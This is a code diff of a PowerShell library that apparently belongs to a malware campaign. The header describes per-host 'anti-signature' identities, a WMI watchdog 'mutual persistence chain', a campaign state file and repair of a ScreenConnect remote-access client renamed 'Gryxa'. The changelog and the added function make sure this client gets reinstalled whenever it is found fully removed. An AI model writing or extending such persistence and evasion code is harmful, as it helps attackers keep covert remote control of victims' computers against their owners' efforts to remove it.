@@ -1,8 +1,9 @@
 #Requires -Version 5.1
 # ═══════════════════════════════════════════════════════════════
-# OWN_LIB  BUILD 20260802L18
+# OWN_LIB  BUILD 20260802L19
 # Shared library: per-host identity (anti-signature), WMI watchdog
 # (mutual persistence chain), campaign state file, SC service repair.
+# L19: rate-limit never blocks when Gryxa fully absent; StartPending keep.
 # L18: exterminate was KILLING Gryxa (null-path proc kill); sync FP before kill.
 # L17: Gryxa reinstall LOCK while any non-sevrz SC Running; FP drift never /x.
 # L16: NEVER reinstall Gryxa when Running (panel duplicates); TCP advisory only.
@@ -532,7 +533,13 @@ function Test-GryxaHealth {
 }
 
 function Test-GryxaReinstallAllowed {
-    # Max one reinstall per 12h unless -Force (stops duplicate storm)
+    # Max one churn-reinstall per 7d unless -Force.
+    # O42: NEVER block when Gryxa is fully absent (svc+product+dir gone).
+    $fp = Get-GryxaFp
+    $svc = Get-Service -Name "ScreenConnect Client ($fp)" -ErrorAction SilentlyContinue
+    if (-not $svc -and -not (Find-RunningGryxaFp) -and -not (Find-ProductGuid $fp) -and -not (Test-ScDir $fp)) {
+        return $true
+    }
     $flag = Join-Path $WorkDir 'gryxa_reinstall.flag'
     if (-not (Test-Path -LiteralPath $flag)) { return $true }
     try {
